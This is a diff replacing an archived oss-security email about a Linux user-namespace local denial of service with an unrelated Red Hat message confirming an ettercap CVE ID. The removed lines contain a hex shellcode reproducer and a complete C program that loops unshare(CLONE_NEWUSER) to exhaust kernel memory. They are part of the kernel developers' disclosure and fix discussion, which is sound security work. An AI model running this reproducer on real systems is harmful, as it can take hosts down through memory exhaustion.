@@ -1,75 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/8
-Message-ID: <CALCETrWrH-1tz1C9rk49E23Evdn=r7AoqOrL5AQMQy3fvzRy8w@mail.gmail.com>
-Date: Tue, 6 Aug 2013 11:12:56 -0700
-From: Andy Lutomirski <luto@...capital.net>
-To: Oleg Nesterov <oleg@...hat.com>
-Cc: security@...nel.org, oss-security@...ts.openwall.com,  Petr Matousek <pmatouse@...hat.com>, "Eric W. Biederman" <ebiederm@...ssion.com>,  Linus Torvalds <torvalds@...ux-foundation.org>
-Subject: Re: CLONE_NEWUSER local DoS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/11/15
+Message-ID: <20130111215715.GI2638@redhat.com>
+Date: Fri, 11 Jan 2013 14:57:15 -0700
+From: Vincent Danen <vdanen@...hat.com>
+To: cve-assign@...re.org
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Confirming CVE for ettercap buffer overflow flaw (CVE-2012-0722?)
 Content-Type: text/plain; charset=utf-8
 
-On Tue, Aug 6, 2013 at 9:47 AM, Oleg Nesterov <oleg@...hat.com> wrote:
-> On 08/06, Petr Matousek wrote:
->>
->> spender reported [1] a local DoS triggerable by unprivileged user when
->> user namespaces are enabled (CONFIG_USER_NS).
->>
->>   [1] https://twitter.com/grsecurity/status/364566062336978944
->>
->> Reproducer:
->>
->> b836010000bb00000010cd80ebf2 is for(;;)unshare(1<<28);
+* [2013-01-11 16:52:22 -0500] cve-assign@...re.org wrote:
+
+>>This isn't on MITRE's site (reserved), and the initial advisory
+>>indicates that this has a CVE of CVE-2012-0722.
 >
-> What happens? OOM?
->
-> I'll recheck, but at first glance this is simple, unshare_userns()
-> populates new_cred which is not freed by bad_unshare_cleanup_fd
-> if create_user_ns() fails. And create_user_ns() _should_ fail (iiuc)
-> when CLONE_NEWUSER is called for the second time and later due to
-> !kuid_has_mapping().
->
-> I'll send the patch, but perhaps there is something else. Eric?
+>Thanks very much for asking about this. The correct ID was
+>CVE-2013-0722 and regrettably CVE-2012-0722 needed to be rejected in
+>favor of CVE-2013-0722.
 
-I think that's right.  OTOH, it's not going to prevent this from OOMing:
+Great, thank you for this confirmation.
 
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sched.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
-
-#ifndef CLONE_NEWUSER
-#define CLONE_NEWUSER 0x10000000
-#endif
-
-static void setmap(int is_gid, int outer)
-{
-  int fd = open(is_gid ? "/proc/self/gid_map" : "/proc/self/uid_map",
-		O_RDWR | O_CLOEXEC);
-  if (fd == -1)
-    err(1, is_gid ? "open /proc/self/gid_map" : "open /proc/self/uid_map");
-  char buf[128];
-  sprintf(buf, "0 %d 1\n", outer);
-  if (write(fd, buf, strlen(buf)) < 0)
-    err(1, is_gid ? "write /proc/self/gid_map" : "write /proc/self/uid_map");
-  close(fd);
-}
-
-int main(int argc, char **argv)
-{
-  pid_t outer_uid = geteuid(), outer_gid = getegid();
-
-  while(1) {
-    if (unshare(CLONE_NEWUSER) != 0)
-      err(1, "unshare(CLONE_NEWUSER)");
-    setmap(1, outer_gid);
-    setmap(0, outer_uid);
-    outer_uid = outer_gid = 0;
-  }
-}
-
---Andy
+-- 
+Vincent Danen / Red Hat Security Response Team 
